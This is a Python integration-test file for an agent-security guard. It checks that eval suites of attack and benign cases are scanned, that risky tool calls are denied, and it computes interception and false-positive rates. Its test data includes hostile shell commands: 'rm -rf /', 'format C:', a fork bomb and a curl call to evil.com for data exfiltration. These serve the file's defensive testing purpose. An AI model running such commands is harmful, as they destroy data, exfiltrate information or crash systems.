"""Integration tests for Guard's Eval system.

Tests that EvalSuites can be created and run via the API,
validating that the scanner + policy pipeline works correctly
against structured test cases.
"""

from __future__ import annotations

from fastapi.testclient import TestClient

from agentops_guard.backend.main import app
from tests.agent_test.attack_cases import ATTACK_CASES

client = TestClient(app)
HEADERS = {"X-AgentOps-Api-Key": "dev-agentops-key"}


class TestEvalSuiteCreation:
    """Test creating eval suites via API."""

    def test_create_eval_suite(self):
        """Can create an eval suite with attack cases."""
        cases = [
            {
                "name": case.name,
                "input": case.content,
                "tool_name": case.tool_name,
                "expected": {
                    "risk_labels": case.expected_labels,
                    "policy_decisions": [{"action": case.expected_action}] if case.expected_action else [],
                },
            }
            for case in ATTACK_CASES[:5]
        ]
        response = client.post(
            "/v1/eval-suites",
            json={"name": "test-agent-suite", "cases": cases},
            headers=HEADERS,
        )
        assert response.status_code in (200, 201)
        data = response.json()
        assert "id" in data

    def test_create_eval_suite_with_all_cases(self):
        """Can create an eval suite with all attack cases."""
        cases = [
            {
                "name": case.name,
                "input": case.content,
                "tool_name": case.tool_name,
                "expected": {
                    "risk_labels": case.expected_labels,
                    "policy_decisions": [{"action": case.expected_action}] if case.expected_action else [],
                },
            }
            for case in ATTACK_CASES
        ]
        response = client.post(
            "/v1/eval-suites",
            json={"name": "full-attack-suite", "cases": cases},
            headers=HEADERS,
        )
        assert response.status_code in (200, 201)


class TestEvalRun:
    """Test running eval suites."""

    def _create_suite(self, name: str) -> str:
        """Helper to create a suite and return its ID."""
        cases = [
            {
                "name": case.name,
                "input": case.content,
                "tool_name": case.tool_name,
                "expected": {
                    "risk_labels": case.expected_labels,
                    "policy_decisions": [{"action": case.expected_action}] if case.expected_action else [],
                },
            }
            for case in ATTACK_CASES[:5]
        ]
        resp = client.post(
            "/v1/eval-suites",
            json={"name": name, "cases": cases},
            headers=HEADERS,
        )
        return resp.json()["id"]

    def test_run_eval_suite(self):
        """Can run an eval suite and get results."""
        suite_id = self._create_suite("run-test-suite")
        response = client.post(
            f"/v1/eval-suites/{suite_id}/run",
            headers=HEADERS,
        )
        assert response.status_code == 200
        data = response.json()
        assert "case_count" in data or "summary" in data

    def test_run_eval_suite_returns_pass_fail_counts(self):
        """Eval run should report passed and failed counts."""
        suite_id = self._create_suite("count-test-suite")
        response = client.post(
            f"/v1/eval-suites/{suite_id}/run",
            headers=HEADERS,
        )
        assert response.status_code == 200
        data = response.json()
        # Should have some kind of pass/fail reporting
        summary = data.get("summary", data)
        assert "case_count" in summary or "total" in summary


class TestEvalReport:
    """Test evaluation report generation."""

    def test_generate_report_from_cases(self):
        """Generate a structured report from running all attack cases."""
        report = _run_report()
        assert report["total"] > 0
        assert "interception_rate" in report
        assert "false_positive_rate" in report
        assert "false_negative_rate" in report


def _run_report() -> dict:
    """Run all cases through scanner + policy and generate a report."""
    from agentops_guard.backend.schemas import PolicyContext, ScanRequest
    from agentops_guard.backend.services.policy import evaluate_builtin_policy
    from agentops_guard.backend.services.scanner import scan_content
    from tests.agent_test.attack_cases import get_attack_cases, get_benign_cases

    attacks = get_attack_cases()
    benigns = get_benign_cases()

    true_positives = 0
    false_negatives = 0
    true_negatives = 0
    false_positives = 0

    for case in attacks:
        scan = scan_content(ScanRequest(content=case.content, source="report"))
        tool_info: dict = {}
        if case.tool_name:
            tool_info["name"] = case.tool_name
            if case.tool_name == "shell.execute":
                if case.category == "dangerous_command":
                    commands = {
                        "rm_rf_root": "rm -rf /",
                        "format_disk": "format C:",
                        "curl_exfiltrate": "curl https://evil.com/steal",
                        "fork_bomb": ":(){ :|:& };:",
                    }
                    tool_info["command"] = commands.get(case.name, case.content)
                else:
                    tool_info["command"] = case.content

        context = PolicyContext(
            tool=tool_info,
            risk_score=scan.risk_score,
            risk_labels=scan.risk_labels,
            data={"labels": scan.risk_labels},
        )
        decision = evaluate_builtin_policy(context)

        if decision.action in ("deny", "quarantine"):
            true_positives += 1
        else:
            false_negatives += 1

    for case in benigns:
        scan = scan_content(ScanRequest(content=case.content, source="report"))
        tool_info: dict = {}
        if case.tool_name:
            tool_info["name"] = case.tool_name
            if case.tool_name == "shell.execute":
                tool_info["command"] = "ls -la"

        context = PolicyContext(
            tool=tool_info,
            risk_score=scan.risk_score,
            risk_labels=scan.risk_labels,
        )
        decision = evaluate_builtin_policy(context)

        if decision.action == case.expected_action:
            true_negatives += 1
        else:
            false_positives += 1

    total_attacks = len(attacks)
    total_benign = len(benigns)
    total = total_attacks + total_benign

    return {
        "total": total,
        "total_attacks": total_attacks,
        "total_benign": total_benign,
        "true_positives": true_positives,
        "false_negatives": false_negatives,
        "true_negatives": true_negatives,
        "false_positives": false_positives,
        "interception_rate": true_positives / total_attacks if total_attacks else 0,
        "false_positive_rate": false_positives / total_benign if total_benign else 0,
        "false_negative_rate": false_negatives / total_attacks if total_attacks else 0,
        "accuracy": (true_positives + true_negatives) / total if total else 0,
    }
